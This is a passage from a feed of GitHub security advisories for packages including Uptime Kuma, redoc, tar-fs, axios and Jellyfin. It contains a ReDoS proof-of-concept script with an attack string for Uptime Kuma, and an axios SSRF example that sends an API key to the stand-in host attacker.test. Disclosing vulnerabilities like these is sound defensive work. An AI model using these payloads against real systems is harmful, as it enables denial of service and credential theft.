<a href="https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></p>
<pre><code class="language-js">// The attack string "httpS://example" + "/".repeat(100000) + "@"
// poc.js
// Import the target file
const Whapi = require("./uptime-kuma/server/notification-providers/whapi");

// Create an instance of Whapi
const whapi = new Whapi();

const notification = {
    whapiApiUrl: "https://e" + "/".repeat(100000) + "@",
};
// console.log(`${notification.whapiApiUrl}`);
// Define the message to be sent
const msg = "Test Attacking";

// Call the send method and handle exceptions
whapi.send(notification, msg)

// 1-5 are the original installation methods for the project
// 6-8 are attack methods
// ---
// 1.run `git clone https://github.com/louislam/uptime-kuma.git`
// 2.run `cd uptime-kuma`
// 3.run `npm run setup`
// 4.run `npm install pm2 -g &amp;&amp; pm2 install pm2-logrotate`
// 5.run `pm2 start server/server.js --name uptime-kuma`
// ---
// 6.Run npm install in the root directory of the same level as `README.md`
// 7.Move `poc.js` to the root directory of the same level as `README.md`
// 8.and then run `node poc.js`
</code></pre>
<p>After running, a noticeable lag can be observed, with the regular expression matching time increasing from a few milliseconds to over 2000 milliseconds.
<img src="https://github.com/user-attachments/assets/98f18fee-7555-410e-98c8-763906843812" alt="redos" width="760"></p>
<p>You can also perform this attack on the web interface. By timing the operation, it can be observed that the lag still occurs. The key to the attack string is appending a large number of <code>/</code> to the URL, followed by a <code>non-/</code> character at the end, entered directly.</p>
<img src="https://github.com/user-attachments/assets/61945200-4397-4933-9170-2a5517613408" alt="1" width="1280">
<img src="https://github.com/user-attachments/assets/c0d7e952-0ec1-4c54-ba31-8b7144c04669" alt="webserver" width="1280">

<h3 id="impact">Impact</h3>
<p><strong>What kind of vulnerability is it?</strong></p>
<p>This is a <code>Regular Expression Denial of Service (ReDoS)</code> vulnerability. ReDoS exploits poorly designed regular expressions that can lead to excessive backtracking under certain input conditions, causing the affected application to consume high CPU and memory resources. This can result in <code>significant performance degradation or complete service unavailability</code>, especially when processing specially crafted attack strings.</p>
<p><strong>Who is impacted?</strong></p>
<ol>
<li><p><strong>Uptime Kuma users</strong>:
Any users or administrators running the Uptime Kuma project are potentially affected, especially if they allow untrusted input through the web interface or notification services like <code>pushdeer.js</code> and <code>whapi.js</code>. Attackers can exploit this vulnerability by injecting crafted strings into the input fields.</p>
</li>
<li><p><strong>Web services and hosting providers</strong>:
If Uptime Kuma is deployed in a production environment, the vulnerability could impact hosting providers or servers running the application, leading to <code>downtime</code>, <code>degraded performance</code>, or <code>resource exhaustion</code>.</p>
</li>
</ol>
<h3 id="solution">Solution</h3>
<p>@louislam I have provided a solution for you to check:<a href="https://github.com/louislam/uptime-kuma/pull/5573">https://github.com/louislam/uptime-kuma/pull/5573</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-hx7h-9vf7-5xhg</a></li>
<li><a href="https://github.com/louislam/uptime-kuma/pull/5573">https://github.com/louislam/uptime-kuma/pull/5573</a></li>
<li><a href="https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0">https://gist.github.com/ShiyuBanzhou/26c918f93b07f5ce90e8f7000d29c7a0</a></li>
<li><a href="https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28">https://gist.github.com/ShiyuBanzhou/bf4cee61603e152c114fa8c4791f9f28</a></li>
<li><a href="https://github.com/advisories/GHSA-hx7h-9vf7-5xhg">https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hx7h-9vf7-5xhg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-31T16:12:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[redoc] Redoc Prototype Pollution via `Module.mergeObjects` Component]]></title>
        <id>https://github.com/advisories/GHSA-9rhg-254w-fh9x</id>
        <link href="https://github.com/advisories/GHSA-9rhg-254w-fh9x"/>
        <updated>2025-03-31T15:58:52.000Z</updated>
        <content type="html"><![CDATA[<p>A prototype pollution in the component Module.mergeObjects (redoc/bundles/redoc.lib.js:2) of redoc &lt;= 2.2.0 allows attackers to cause a Denial of Service (DoS) via supplying a crafted payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57083">https://nvd.nist.gov/vuln/detail/CVE-2024-57083</a></li>
<li><a href="https://github.com/Redocly/redoc/issues/2499">https://github.com/Redocly/redoc/issues/2499</a></li>
<li><a href="https://github.com/Redocly/redoc/pull/2638">https://github.com/Redocly/redoc/pull/2638</a></li>
<li><a href="https://github.com/advisories/GHSA-9rhg-254w-fh9x">https://github.com/advisories/GHSA-9rhg-254w-fh9x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9rhg-254w-fh9x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-28T21:30:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@alizeait/unflatto] @alizeait/unflatto Prototype Pollution via `exports.unflatto` Method]]></title>
        <id>https://github.com/advisories/GHSA-799q-f2px-wx8c</id>
        <link href="https://github.com/advisories/GHSA-799q-f2px-wx8c"/>
        <updated>2025-03-31T15:57:17.000Z</updated>
        <content type="html"><![CDATA[<p>alizeait unflatto &lt;= 1.0.2 was discovered to contain a prototype pollution via the method exports.unflatto at /dist/index.js. This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38988">https://nvd.nist.gov/vuln/detail/CVE-2024-38988</a></li>
<li><a href="https://gist.github.com/mestrtee/4c5dfb66bea377889c44dd6c8af28713">https://gist.github.com/mestrtee/4c5dfb66bea377889c44dd6c8af28713</a></li>
<li><a href="https://github.com/alizeait/unflatto/issues/32">https://github.com/alizeait/unflatto/issues/32</a></li>
<li><a href="https://github.com/advisories/GHSA-799q-f2px-wx8c">https://github.com/advisories/GHSA-799q-f2px-wx8c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-799q-f2px-wx8c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-28T21:30:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cool-path] depath and cool-path vulnerable to Prototype Pollution via `set()` Method]]></title>
        <id>https://github.com/advisories/GHSA-4h4x-4m75-47j4</id>
        <link href="https://github.com/advisories/GHSA-4h4x-4m75-47j4"/>
        <updated>2025-03-31T15:56:48.000Z</updated>
        <content type="html"><![CDATA[<p>janryWang products depath v1.0.6 and cool-path v1.1.2 were discovered to contain a prototype pollution via the set() method at setIn (lib/index.js:90). This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38985">https://nvd.nist.gov/vuln/detail/CVE-2024-38985</a></li>
<li><a href="https://github.com/janryWang/depath/issues/11">https://github.com/janryWang/depath/issues/11</a></li>
<li><a href="https://gist.github.com/mestrtee/32c0a48023036e51918f6a098f21953d">https://gist.github.com/mestrtee/32c0a48023036e51918f6a098f21953d</a></li>
<li><a href="https://github.com/advisories/GHSA-4h4x-4m75-47j4">https://github.com/advisories/GHSA-4h4x-4m75-47j4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4h4x-4m75-47j4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-28T21:30:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[depath] depath and cool-path vulnerable to Prototype Pollution via `set()` Method]]></title>
        <id>https://github.com/advisories/GHSA-4h4x-4m75-47j4</id>
        <link href="https://github.com/advisories/GHSA-4h4x-4m75-47j4"/>
        <updated>2025-03-31T15:56:48.000Z</updated>
        <content type="html"><![CDATA[<p>janryWang products depath v1.0.6 and cool-path v1.1.2 were discovered to contain a prototype pollution via the set() method at setIn (lib/index.js:90). This vulnerability allows attackers to execute arbitrary code or cause a Denial of Service (DoS) via injecting arbitrary properties.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38985">https://nvd.nist.gov/vuln/detail/CVE-2024-38985</a></li>
<li><a href="https://github.com/janryWang/depath/issues/11">https://github.com/janryWang/depath/issues/11</a></li>
<li><a href="https://gist.github.com/mestrtee/32c0a48023036e51918f6a098f21953d">https://gist.github.com/mestrtee/32c0a48023036e51918f6a098f21953d</a></li>
<li><a href="https://github.com/advisories/GHSA-4h4x-4m75-47j4">https://github.com/advisories/GHSA-4h4x-4m75-47j4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4h4x-4m75-47j4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-28T21:30:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File]]></title>
        <id>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</id>
        <link href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx"/>
        <updated>2025-03-28T22:11:43.000Z</updated>
        <content type="html"><![CDATA[<p>An Improper Link Resolution Before File Access ("Link Following") and Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>
<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12905">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>
<li><a href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-27T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File]]></title>
        <id>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</id>
        <link href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx"/>
        <updated>2025-03-28T22:11:43.000Z</updated>
        <content type="html"><![CDATA[<p>An Improper Link Resolution Before File Access ("Link Following") and Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>
<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12905">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>
<li><a href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-27T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tar-fs] tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File]]></title>
        <id>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</id>
        <link href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx"/>
        <updated>2025-03-28T22:11:43.000Z</updated>
        <content type="html"><![CDATA[<p>An Improper Link Resolution Before File Access ("Link Following") and Improper Limitation of a Pathname to a Restricted Directory ("Path Traversal"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.</p>
<p>This issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12905">https://nvd.nist.gov/vuln/detail/CVE-2024-12905</a></li>
<li><a href="https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed">https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed</a></li>
<li><a href="https://github.com/advisories/GHSA-pq67-2wwv-3xjx">https://github.com/advisories/GHSA-pq67-2wwv-3xjx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq67-2wwv-3xjx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-27T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL]]></title>
        <id>https://github.com/advisories/GHSA-jr5f-v2jv-69x6</id>
        <link href="https://github.com/advisories/GHSA-jr5f-v2jv-69x6"/>
        <updated>2025-03-28T14:57:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).
Reference: axios/axios#6463</p>
<p>A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠<code>baseURL</code> is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.</p>
<h3 id="details">Details</h3>
<p>Consider the following code snippet:</p>
<pre><code class="language-js">import axios from "axios";

const internalAPIClient = axios.create({
  baseURL: "http://example.test/api/v1/users/",
  headers: {
    "X-API-KEY": "1234567890",
  },
});

// const userId = "123";
const userId = "http://attacker.test/";

await internalAPIClient.get(userId); // SSRF
</code></pre>
<p>In this example, the request is sent to <code>http://attacker.test/</code> instead of the <code>baseURL</code>. As a result, the domain owner of <code>attacker.test</code> would receive the <code>X-API-KEY</code> included in the request headers.</p>
<p>It is recommended that:</p>
<ul>
<li>   When <code>baseURL</code> is set, passing an absolute URL such as <code>http://attacker.test/</code> to <code>get()</code> should not ignore <code>baseURL</code>.</li>
<li>   Before sending the HTTP request (after combining the <code>baseURL</code> with the user-provided parameter), axios should verify that the resulting URL still begins with the expected <code>baseURL</code>.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Follow the steps below to reproduce the issue:</p>
<ol>
<li>   Set up two simple HTTP servers:</li>
</ol>
<pre><code>mkdir /tmp/server1 /tmp/server2
echo "this is server1" &gt; /tmp/server1/index.html 
echo "this is server2" &gt; /tmp/server2/index.html
python -m http.server -d /tmp/server1 10001 &amp;
python -m http.server -d /tmp/server2 10002 &amp;
</code></pre>
<ol start="2">
<li>   Create a script (e.g., main.js):</li>
</ol>
<pre><code class="language-js">import axios from "axios";
const client = axios.create({ baseURL: "http://localhost:10001/" });
const response = await client.get("http://localhost:10002/");
console.log(response.data);
</code></pre>
<ol start="3">
<li>   Run the script:</li>
</ol>
<pre><code>$ node main.js
this is server2
</code></pre>
<p>Even though <code>baseURL</code> is set to <code>http://localhost:10001/</code>, axios sends the request to <code>http://localhost:10002/</code>.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>   Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.</li>
<li>   SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.</li>
<li>   Affected Users: Software that uses <code>baseURL</code> and does not validate path parameters is affected by this issue.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6">https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6</a></li>
<li><a href="https://github.com/axios/axios/issues/6463">https://github.com/axios/axios/issues/6463</a></li>
<li><a href="https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f">https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v1.8.2">https://github.com/axios/axios/releases/tag/v1.8.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27152">https://nvd.nist.gov/vuln/detail/CVE-2025-27152</a></li>
<li><a href="https://github.com/axios/axios/pull/6829">https://github.com/axios/axios/pull/6829</a></li>
<li><a href="https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde">https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde</a></li>
<li><a href="https://github.com/advisories/GHSA-jr5f-v2jv-69x6">https://github.com/advisories/GHSA-jr5f-v2jv-69x6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr5f-v2jv-69x6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:16:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL]]></title>
        <id>https://github.com/advisories/GHSA-jr5f-v2jv-69x6</id>
        <link href="https://github.com/advisories/GHSA-jr5f-v2jv-69x6"/>
        <updated>2025-03-28T14:57:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery).
Reference: axios/axios#6463</p>
<p>A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠<code>baseURL</code> is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.</p>
<h3 id="details">Details</h3>
<p>Consider the following code snippet:</p>
<pre><code class="language-js">import axios from "axios";

const internalAPIClient = axios.create({
  baseURL: "http://example.test/api/v1/users/",
  headers: {
    "X-API-KEY": "1234567890",
  },
});

// const userId = "123";
const userId = "http://attacker.test/";

await internalAPIClient.get(userId); // SSRF
</code></pre>
<p>In this example, the request is sent to <code>http://attacker.test/</code> instead of the <code>baseURL</code>. As a result, the domain owner of <code>attacker.test</code> would receive the <code>X-API-KEY</code> included in the request headers.</p>
<p>It is recommended that:</p>
<ul>
<li>   When <code>baseURL</code> is set, passing an absolute URL such as <code>http://attacker.test/</code> to <code>get()</code> should not ignore <code>baseURL</code>.</li>
<li>   Before sending the HTTP request (after combining the <code>baseURL</code> with the user-provided parameter), axios should verify that the resulting URL still begins with the expected <code>baseURL</code>.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Follow the steps below to reproduce the issue:</p>
<ol>
<li>   Set up two simple HTTP servers:</li>
</ol>
<pre><code>mkdir /tmp/server1 /tmp/server2
echo "this is server1" &gt; /tmp/server1/index.html 
echo "this is server2" &gt; /tmp/server2/index.html
python -m http.server -d /tmp/server1 10001 &amp;
python -m http.server -d /tmp/server2 10002 &amp;
</code></pre>
<ol start="2">
<li>   Create a script (e.g., main.js):</li>
</ol>
<pre><code class="language-js">import axios from "axios";
const client = axios.create({ baseURL: "http://localhost:10001/" });
const response = await client.get("http://localhost:10002/");
console.log(response.data);
</code></pre>
<ol start="3">
<li>   Run the script:</li>
</ol>
<pre><code>$ node main.js
this is server2
</code></pre>
<p>Even though <code>baseURL</code> is set to <code>http://localhost:10001/</code>, axios sends the request to <code>http://localhost:10002/</code>.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>   Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.</li>
<li>   SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.</li>
<li>   Affected Users: Software that uses <code>baseURL</code> and does not validate path parameters is affected by this issue.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6">https://github.com/axios/axios/security/advisories/GHSA-jr5f-v2jv-69x6</a></li>
<li><a href="https://github.com/axios/axios/issues/6463">https://github.com/axios/axios/issues/6463</a></li>
<li><a href="https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f">https://github.com/axios/axios/commit/fb8eec214ce7744b5ca787f2c3b8339b2f54b00f</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v1.8.2">https://github.com/axios/axios/releases/tag/v1.8.2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27152">https://nvd.nist.gov/vuln/detail/CVE-2025-27152</a></li>
<li><a href="https://github.com/axios/axios/pull/6829">https://github.com/axios/axios/pull/6829</a></li>
<li><a href="https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde">https://github.com/axios/axios/commit/02c3c69ced0f8fd86407c23203835892313d7fde</a></li>
<li><a href="https://github.com/advisories/GHSA-jr5f-v2jv-69x6">https://github.com/advisories/GHSA-jr5f-v2jv-69x6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr5f-v2jv-69x6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T15:16:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jellyfin-web] Jellyfin Web Cross-Site Scripting (XSS) via Playlist Name]]></title>
        <id>https://github.com/advisories/GHSA-2h5r-cqfc-45v6</id>
        <link href="https://github.com/advisories/GHSA-2h5r-cqfc-45v6"/>
        <updated>2025-03-27T21:18:24.000Z</updated>
        <content type="html"><![CDATA[<p>In Jellyfin 10.8.x through 10.8.3, the name of a playlist is vulnerable to stored XSS. This allows an attacker to steal access tokens from the localStorage of the victim.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-23636">https://nvd.nist.gov/vuln/detail/CVE-2023-23636</a></li>
<li><a href="https://github.com/jellyfin/jellyfin-web/issues/3788">https://github.com/jellyfin/jellyfin-web/issues/3788</a></li>
<li><a href="https://herolab.usd.de/security-advisories">https://herolab.usd.de/security-advisories</a></li>
<li><a href="https://herolab.usd.de/security-advisories/usd-2022-0030">https://herolab.usd.de/security-advisories/usd-2022-0030</a></li>
<li><a href="https://github.com/jellyfin/jellyfin-web/pull/3789">https://github.com/jellyfin/jellyfin-web/pull/3789</a></li>
<li><a href="https://github.com/jellyfin/jellyfin/releases/tag/v10.8.4">https://github.com/jellyfin/jellyfin/releases/tag/v10.8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-2h5r-cqfc-45v6">https://github.com/advisories/GHSA-2h5r-cqfc-45v6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2h5r-cqfc-45v6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-02-03T03:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jellyfin-web] Jellyfin Web Cross-Site Scripting (XSS) via Collection Name]]></title>
        <id>https://github.com/advisories/GHSA-749c-pc87-4qcw</id>
        <link href="https://github.com/advisories/GHSA-749c-pc87-4qcw"/>
        <updated>2025-03-27T21:18:05.000Z</updated>
        <content type="html"><![CDATA[<p>In Jellyfin 10.8.x through 10.8.3, the name of a collection is vulnerable to stored XSS. This allows an attacker to steal access tokens from the localStorage of the victim.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-23635">https://nvd.nist.gov/vuln/detail/CVE-2023-23635</a></li>
<li><a href="https://github.com/jellyfin/jellyfin-web/issues/3788">https://github.com/jellyfin/jellyfin-web/issues/3788</a></li>
<li><a href="https://herolab.usd.de/security-advisories">https://herolab.usd.de/security-advisories</a></li>
<li><a href="https://herolab.usd.de/security-advisories/usd-2022-0031">https://herolab.usd.de/security-advisories/usd-2022-0031</a></li>
<li><a href="https://github.com/jellyfin/jellyfin-web/pull/3789">https://github.com/jellyfin/jellyfin-web/pull/3789</a></li>
<li><a href="https://github.com/jellyfin/jellyfin/releases/tag/v10.8.4">https://github.com/jellyfin/jellyfin/releases/tag/v10.8.4</a></li>
<li><a href="https://github.com/advisories/GHSA-749c-pc87-4qcw">https://github.com/advisories/GHSA-749c-pc87-4qcw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-749c-pc87-4qcw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-02-03T03:30:25.000Z</published>
    </entry>
</feed>